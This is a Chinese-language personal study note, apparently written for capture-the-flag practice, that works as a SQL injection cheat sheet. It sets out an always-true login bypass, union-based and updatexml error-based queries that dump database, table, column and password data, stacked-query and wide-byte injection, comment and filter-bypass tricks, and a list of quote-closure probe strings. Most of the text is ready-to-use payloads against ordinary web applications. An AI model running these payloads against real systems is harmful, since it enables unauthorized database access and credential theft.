---
title: sql注入
description: 整理 SQL 注入基础概念、常见注入语句和实用 payload。
categories:
  - 笔记
tags:
  - 日常
---


# #sql注入

库(database)(table_schema) ——> 表(table_name) ——> 列(column_name) ——> 数据

数据库 为层级结构：

```
+数据库 ( database )
+ - 表_user ( table_user )
+ - 表_users ( table_users )
+ + - 列_id (column_id)
+ + - 列_username (column_username)
+ + - 列_password (column_password)
+ + + - 数据
+ + + - 数据
```

### payload注入

简单sql注入语句：

```
SELECT 列名1, 列名2, ... FROM 表名 WHERE 条件
```

万能密钥

```
'or'1'='1
```

**union注入**

> ?name=admin'Order by 3#
>
> ?name=admin'union select 1,database(),3#
>
> ?name=admin'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'#
>
> ?name=admin'union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'#
>
> ?name=admin'union select 1,2,group_concat(username,password) from users#

**updatexml报错注入**

> ?username=admin'or(updatexml(1,concat(0x7e,**database()**,0x7e),1))%23	---爆库名geek，%23是#，%27是'
>
> ?username=admin%27or(updatexml(1,concat(0x7e,**(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(%27geek%27))**,0x7e),1))%23	---爆表名H4rDsq1
>
> ?username=admin%27or(updatexml(1,concat(0x7e,**(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(%27H4rDsq1%27))**,0x7e),1))%23	---爆字段id,username,password
>
> ?username=admin%27or(updatexml(1,concat(0x7e,**(select(password)from(H4rDsq1))**,0x7e),1))%23	---报数据flag{2ffec74c-5046-40b9-b115-ed
>
> 这里只爆出前面一部分flag，然后再使用right()函数拼接flag
> ?username=admin'or(updatexml(1,concat(0x7e,**(select(group_concat((right(password,25))))from(H4rDsq1))**,0x7e),1))%23	---6-40b9-b115-edce687a298b}

**堆叠注入**

> 1';show databases;#	---库
>
> 1';show tables;#	---表
>
> 1'; show columns from FlagHere;#	---表中列
>
> 补充：无法读取数据，select被严格过滤时，可以去看看青岑 ezsql_11 的Handler 句柄法来读取字段数据。

**宽字节注入**

> ?id=1%df'#	---判断有没有宽字节绕过
>
> ?id=1%df' order by 5 #

**无列名注入**

> 在已知表名，但不知道列名的情况下进行 sql 注入。

**异或注入**

> 异或注入是盲注的一种类型，因为异或逻辑通常返回的是1和0，所以一般用于盲注中。应用场景是过滤了union  select and  or  orderby等一些关键字。还能绕过空格过滤。

### 注释

- `-- -` 
- `-- `
- `-- +` 
- `#`、`%23` 后面的内容都将被注释

### 针对绕过

- 空格过滤：`/**/`、`%0c`、小括号绕过
- 注释符过滤：
- select过滤：双写、堆叠



## 闭合类型

**通过是否报错**

比如，我们使用 `1'` 进行试探:

| 后台实际输入 | 执行语句                                              | 是否报错 以及 相关解释                                       |
| :----------- | :---------------------------------------------------- | :----------------------------------------------------------- |
| `"1'"`       | `SELECT username,password FROM users WHERE id = "1'"` | `""` 中为可以包含 `'` ，而 `1'` 是一个合法的字符串 , 在查询时会先被强制类型转换为数字，**不会报错** |
| `1'`         | `SELECT username,password FROM users WHERE id = 1'`   | 这里的 `'` 就没有闭合，**会报错**。                          |
| `'1''`       | `SELECT username,password FROM users WHERE id = '1''` | 这里的 `'`与前序的`'` 闭合了但这样就留下了后序单着的 `'`，**会报错**。 |

**字典**

```
 and 1=1 -- 
 and 1=2 -- 
' and 1=1 -- 
' and 1=2 -- 
" and 1=1 -- 
" and 1=2 -- 
) and 1=1 -- 
) and 1=2 -- 
') and 1=1 -- 
') and 1=2 -- 
") and 1=1 -- 
") and 1=2 -- 
)) and 1=1 -- 
)) and 1=2 -- 
')) and 1=1 -- 
')) and 1=2 -- 
")) and 1=1 -- 
")) and 1=2 -- 
))) and 1=1 -- 
))) and 1=2 -- 
'))) and 1=1 -- 
'))) and 1=2 -- 
"))) and 1=1 -- 
"))) and 1=2 --
```

